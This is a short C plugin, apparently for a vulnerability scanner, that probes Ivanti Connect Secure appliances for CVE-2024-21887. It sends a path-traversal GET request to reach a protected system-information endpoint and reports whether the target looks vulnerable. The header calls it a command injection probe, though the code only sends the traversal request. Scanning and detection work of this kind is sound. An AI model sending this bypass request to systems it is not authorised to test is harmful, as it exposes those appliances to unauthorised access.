/* http-vuln-cve2024-21887-4 - Ivanti Connect Secure command injection probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/api/v1/totp/user-backup-code/../../system/system-information", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2024-21887-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "Ivanti")) {
        ar_out(ctx, "VULNERABLE: /api/v1/totp/user-backup-code/../../system/system-information [%d] (CVE-2024-21887)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2024-21887 (/api/v1/totp/user-backup-code/../../system/system-information [%d])", ar_http_status(resp));
    }
    return 0;
}
